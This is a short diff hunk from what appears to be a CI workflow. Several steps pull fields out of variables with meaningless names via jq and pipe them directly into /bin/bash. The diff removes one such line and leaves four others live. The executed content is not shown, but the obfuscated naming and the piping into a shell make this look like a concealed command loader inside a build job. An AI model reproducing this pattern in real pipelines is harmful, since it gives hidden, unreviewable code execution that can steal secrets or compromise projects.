@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$khl9" | jq -r .a60 | /bin/bash
           printf '%s' "$ov21127" | jq -r .lundl376 | /bin/bash
           printf '%s' "$bozlp20" | jq -r .s33 | /bin/bash
-          printf '%s' "$dzh2671" | jq -r .wi18318 | /bin/bash
           echo $oyv91 | jq -r .vatog680 | /bin/bash
 
       - name: Archive data
